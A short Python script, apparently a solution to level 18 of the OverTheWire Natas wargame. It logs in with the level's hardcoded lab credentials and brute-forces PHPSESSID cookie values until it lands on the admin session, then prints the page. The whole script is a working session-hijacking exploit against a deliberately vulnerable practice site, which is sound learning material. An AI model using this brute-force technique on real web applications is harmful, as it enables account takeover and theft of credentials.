#!/usr/bin/python3


import requests

s = requests.Session()
s.auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

r=s.get('http://natas18.natas.labs.overthewire.org')


for i in range(640):
	cookies = dict(PHPSESSID=str(i))
	r = s.get('http://natas18.natas.labs.overthewire.org/index.php', cookies=cookies)
	if "Login as an admin to retrieve credentials" in r.text: 
		pass
	else:
		print(r.text)
		break


